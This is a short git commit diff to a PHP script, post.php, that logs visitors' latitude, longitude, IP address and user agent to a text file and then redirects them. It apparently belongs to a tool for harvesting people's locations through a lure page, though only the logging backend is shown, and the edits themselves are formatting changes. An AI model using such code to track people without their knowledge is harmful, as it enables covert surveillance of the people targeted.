bcb88764e1610a8e229f0eaec11383d4e59905d1
termux-lab <59764619+termux-lab@users.noreply.github.com>
2020-01-11 16:13:59 +0300

    Update post.php

--- post.php
+++ post.php
@@ -3,9 +3,9 @@ $lat = $_GET['lat'];
 $long = $_GET['long'];
 $ip = $_SERVER['REMOTE_ADDR'];
 $use = $_SERVER['HTTP_USER_AGENT'];
-$add = "latitude: $lat \r longitude: $long \r IP: $ip \r User: $use \r ____________";
+$add = "latitude: $lat \r longitude: $long \r IP: $ip \r User: $use \r ____________ \r";
 $file = fopen("data.txt", "a+");
 fwrite($file, $add);
 fclose($file);
-header("location: stop.html");
+header("location:/stop.html");
 ?>
